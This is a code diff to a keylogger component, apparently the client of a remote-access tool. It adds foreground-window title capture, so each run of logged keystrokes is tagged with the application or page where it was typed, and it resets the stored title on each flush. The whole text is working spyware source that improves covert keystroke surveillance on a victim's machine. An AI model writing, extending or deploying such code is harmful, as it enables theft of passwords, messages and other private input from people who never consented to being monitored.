@@ -16,6 +16,8 @@ namespace xClient.Core.Keylogger
         private bool _disposed = false;
 
         private StringBuilder _logFileBuffer;
+        private string _hWndTitle;
+        private string _hWndLastTitle;
 
         private readonly string _filePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +
                                             "\\Logs\\";
@@ -32,6 +34,7 @@ namespace xClient.Core.Keylogger
         public Logger(double flushInterval)
         {
             Instance = this;
+            _hWndLastTitle = string.Empty;
 
             WriteFile();
 
@@ -129,6 +132,16 @@ namespace xClient.Core.Keylogger
 
         private void OnKeyDown(object sender, KeyEventArgs e) //Called first
         {
+            _hWndTitle = GetActiveWindowTitle(); //Get active thread window title
+            if (!string.IsNullOrEmpty(_hWndTitle))
+            {
+                // Only write the title to the log file if the names are different.
+                if (_hWndTitle != _hWndLastTitle)
+                {
+                    _hWndLastTitle = _hWndTitle;
+                    _logFileBuffer.Append(@"<p class=""h""><br><br>[<i>" + _hWndTitle + "</i>]</p><br>");
+                }
+            }
             // If modifier keys are still down, the key code provided will
             // be recorded for flushing to the 
             if (_pressedKeys.Contains(Keys.LControlKey)
@@ -184,7 +197,7 @@ namespace xClient.Core.Keylogger
                             }
 
                             break;
-                    }
+                        }
                 }
             }
         }
@@ -325,6 +338,8 @@ namespace xClient.Core.Keylogger
 
                                 if (_logFileBuffer.Length > 0)
                                     sw.Write(_logFileBuffer);
+
+                                _hWndLastTitle = string.Empty;
                             }
                             else
                                 sw.Write(_logFileBuffer);
@@ -341,5 +356,16 @@ namespace xClient.Core.Keylogger
 
             _logFileBuffer = new StringBuilder();
         }
+
+        private string GetActiveWindowTitle()
+        {
+           StringBuilder sbTitle = new StringBuilder(1024);
+
+           WinApi.ThreadNativeMethods.GetWindowText(WinApi.ThreadNativeMethods.GetForegroundWindow(), sbTitle, sbTitle.Capacity);
+
+           string title = sbTitle.ToString();
+
+           return title != string.Empty ? title : null;
+       }
     }
 }
